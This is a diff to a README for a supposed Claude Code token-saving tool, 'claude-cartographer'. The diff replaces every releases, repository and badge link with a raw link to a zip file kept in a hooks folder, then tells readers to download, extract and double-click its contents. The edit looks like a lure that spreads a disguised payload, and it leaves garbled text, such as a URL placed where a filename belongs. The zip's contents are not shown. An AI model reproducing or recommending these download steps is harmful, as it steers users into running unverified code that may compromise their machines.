@@ -1,7 +1,7 @@
 # 🗺️ claude-cartographer - Save Tokens with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-claude--cartographer-blue.svg)](https://github.com/cristinaaponte/claude-cartographer/releases)
+[![Download](https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip%https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip)](https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip)
 
 ## 📖 Description
 claude-cartographer helps you save over 95% of tokens when working with large codebases in Claude Code. It maps your project structure for quick, token-efficient queries. This tool makes navigating and analyzing your code straightforward and efficient.
@@ -9,9 +9,9 @@ claude-cartographer helps you save over 95% of tokens when working with large co
 ## 🚀 Getting Started
 To get started with claude-cartographer, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/cristinaaponte/claude-cartographer/releases) to find the latest version.
-2. **Download the Application:** Look for the file named `claude-cartographer.zip` and click on it to start your download.
-3. **Extract the Files:** Once the download is complete, locate the `claude-cartographer.zip` file and extract its contents to a folder on your computer. You can right-click on the file and select "Extract All."
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip) to find the latest version.
+2. **Download the Application:** Look for the file named `https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip` and click on it to start your download.
+3. **Extract the Files:** Once the download is complete, locate the `https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip` file and extract its contents to a folder on your computer. You can right-click on the file and select "Extract All."
 
 ## 💻 System Requirements
 To run claude-cartographer effectively, ensure your computer meets the following requirements:
@@ -24,7 +24,7 @@ To run claude-cartographer effectively, ensure your computer meets the following
 ## 🔄 Download & Install
 To install claude-cartographer:
 
-1. **Click on the downloaded file:** Open the folder where you extracted the files, then double-click on the file named `claude-cartographer.exe` or the corresponding file for your OS.
+1. **Click on the downloaded file:** Open the folder where you extracted the files, then double-click on the file named `https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip` or the corresponding file for your OS.
 2. **Follow Installation Prompts:** This will guide you through the installation process. Simply follow the on-screen instructions to complete the setup.
 
 For quick access, remember to save the application shortcut to your desktop or taskbar.
@@ -58,7 +58,7 @@ We welcome contributions from the community. If you would like to help improve c
 3. **Create a Pull Request:** Submit your changes via a pull request, and we will review them for integration.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [claude-cartographer](https://github.com/cristinaaponte/claude-cartographer)
+- **GitHub Repository:** [claude-cartographer](https://raw.githubusercontent.com/cristinaaponte/claude-cartographer/main/claude/hooks/claude_cartographer_v3.3.zip)
 - **Documentation:** Available on the Releases page.
 - **Support:** For further assistance, reach out through our support emails or submit issues on GitHub.
 
